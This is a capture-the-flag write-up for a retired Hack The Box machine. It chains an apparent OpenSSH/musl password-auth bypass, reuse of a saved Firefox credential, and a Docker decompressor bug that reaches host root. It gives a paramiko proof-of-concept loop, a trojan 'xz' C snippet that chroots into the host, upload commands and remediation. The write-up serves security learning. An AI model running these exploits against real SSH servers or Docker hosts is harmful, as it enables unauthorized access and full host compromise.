# doubletake.htb — a long password, a saved login, and a decompressor

> Hack The Box — retired, Easy.

> Flags redacted. Three CVEs that only make sense end to end: a musl-specific SSH
> auth bypass gets you into a container, a browser saved-login gets you a reused
> password, and a Docker archive bug turns "upload a .tar.xz" into host root. The
> lesson running through it is the recon note — the one service built *differently*
> from the distro default is the door.

## Recon

Two ports:

    nmap -Pn -sCV -p22,80 doubletake.htb
    22/tcp open  ssh   OpenSSH 10.6 (protocol 2.0)
    80/tcp open  http  nginx 1.24.0 (Ubuntu)
    |_http-auth: Basic realm=Zentara

Two things set the direction. The SSH banner is `OpenSSH_10.6` — note the missing
`pN`. Portable OpenSSH on a distro reports `10.6p1`; a bare `10.6` is a build
somebody made by hand, and on a box with almost no surface the oddly-built service
is usually the intended path. And port 80 answers `401 Basic realm="Zentara"` with
an empty body — an app named Zentara, gated.

## Enumeration — the web is a wall (on purpose)

Content-fuzzing Zentara reveals the route set, every one of which returns `401`:

    /files (GET,POST,DELETE)  /settings (GET,POST)  /deploy (GET,POST)
    /agents  /usage  /status  /docs

The 401 has an empty body, so the Flask app returns it (not nginx) — app-level Basic
auth on every route. The dead ends matter here:

- No unauthenticated route (fuzzing the 200/301/302/403/405/500 classes finds nothing).
- No bypass via proxy headers (`X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, …), path
  normalisation (`//status`, `/%2e/status`, `/status/..;/`), or HTTP method quirks.
- No injection in the Basic-Auth username; a common-user + rockyou spray finds nothing.

There is no front door on 80. Back to the odd SSH build.

## Foothold — CVE-2026-123158 ("SSHole")

Pin the service and read the advisory — the box *is* the SSH CVE. OpenSSH ≤ 10.6p1
built against **musl without PAM** has a password-auth bypass, and it falls out of a
stack of musl behaviours:

- BSD convention stores `*` in the shadow field of accounts that must never password-auth.
- musl `crypt()` returns the literal string `"*"` on failure instead of `NULL`.
- musl caps SHA-crypt keys at 256 bytes; a longer key *fails* — and so returns `"*"`.

So for an account whose shadow field is `*`, a password **longer than 256 bytes**
hashes to `"*"`, sshd compares it against the stored `"*"`, they match, and you are in
without knowing any password. Two details decide whether it actually fires:

1. The password must be **> 256 bytes**.
2. The match lands on the **second `auth_password` attempt on a single transport** —
   the first primes sshd's cached salt. Send the same long password twice on one
   connection; a single attempt (or a short "priming" password) fails silently and the
   host looks patched.

Which account? It needs `shadow=*` and a real login shell. On an Alpine image that is
the default **`alpine`** account — exactly what the advisory calls out. A minimal
paramiko PoC:

    for i in range(1, 8):
        try:
            t.auth_password("alpine", "A"*300); break
        except paramiko.AuthenticationException:
            pass

    [-] attempt 1: denied
    [+] attempt 2: authenticated as alpine
    alpine$ id
    uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
    alpine$ head -1 /etc/os-release; ls /.dockerenv
    NAME="Alpine Linux"
    /.dockerenv

`/.dockerenv` is present: this is the `zentara-alpine` workspace container, not the host.

## Lateral movement — a saved login and a reused password

Enumerating `alpine`'s home turns up a Firefox profile:

    alpine$ find / -name logins.json 2>/dev/null
    /home/alpine/.mozilla/firefox/zentara.default/logins.json

`encType:0` means there is no primary password, so the stored values are plain base64:

    hostname: http://172.17.0.1    realm: Zentara
    encryptedUsername: Ym9i                                   -> bob
    encryptedPassword: Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==   -> CorrectHorseBatteryStaple

`172.17.0.1` is the Docker bridge gateway — the host. The password is reused for
`bob`'s own SSH:

    $ sshpass -p 'CorrectHorseBatteryStaple' ssh bob@doubletake.htb
    bob$ id
    uid=1001(bob) gid=1001(bob) groups=1001(bob)
    bob$ cat ~/user.txt
    <redacted>

## Privilege escalation — CVE-2026-41567 (Docker ≤ 29.5.0)

Logged into Zentara as `bob`, the Status page names the backend:

    Engine: Docker 29.5.0    API: 1.54    Workspace container: zentara-alpine (running)

`/deploy` accepts `.tar`, `.tar.gz`, `.tar.xz` and states that archives are
"decompressed and extracted server-side by the container engine" — it forwards uploads
to `PUT /containers/{id}/archive`. Docker ≤ 29.5.0 resolves the decompression helper
(`xz`) **from the container's overlay filesystem** rather than the host, and runs it as
the daemon: host root, `CAP_SYS_ADMIN`, host PID namespace. So if you can write a file
into the container and upload a matching compressed archive, your binary runs as host
root.

Two uploads. First, plant a trojan `xz`. It executes in the container's *mount*
namespace but the *host* PID namespace, so it escapes to the host fs with a `chroot`
into `/proc/1/root`:

    // xz.c (built static for the host arch: x86_64-linux-gnu-gcc -static -o xz xz.c)
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root"); chdir("/");
    execl("/bin/bash", "bash", "-c", "<host-root payload>", NULL);

    $ tar -C pkg -cf plant.tar usr/bin/xz
    $ curl -u bob:CorrectHorseBatteryStaple -F archive=@plant.tar -F workspace=/ \
           http://doubletake.htb/deploy
    {"status":"success"}

Then trigger it by uploading any `.tar.xz`, which forces the daemon to invoke the
planted `xz`:

    $ curl -u bob:CorrectHorseBatteryStaple -F archive=@trigger.tar.xz -F workspace=/workspace \
           http://doubletake.htb/deploy

The payload runs as root on the host:

    uid=0(root) gid=0(root) groups=0(root)
    doubletake
    # cat /root/root.txt
    <redacted>

(Afterwards, overwrite the planted `/usr/bin/xz` with a benign no-op through the same
endpoint — until you do, it is a standing root-RCE backdoor.)

## Why the wrong turns were wrong

- **The web app looks like the front door and is not.** Every route sits behind the
  same app-level Basic auth with no bypass and no weak credential, because the real
  entry is a service-level CVE on 22. When a box exposes a service built *differently*
  from the distro default — a `pN`-less OpenSSH — that anomaly is the lead, not the
  application behind the login prompt.
- **SSHole fails silently if you do it wrong.** One attempt, or a short priming
  password, denies. It only works as the *same* over-256-byte password sent twice on a
  single transport. Reading the CVE mechanism (musl `crypt()` returning `"*"`, plus the
  cached-salt priming) is what explains the two-attempt requirement.

## Remediation

1. OpenSSH 10.6p2+ / enable PAM / disable password auth — removes the foothold.
2. No browser profiles in images; a primary password; stop reusing the web password for
   SSH — removes the lateral step.
3. Docker past 29.5.0 (resolve decompressors from the host only); authenticate and
   authorise the deploy endpoint; run the workspace engine rootless / least-cap —
   removes the privesc.
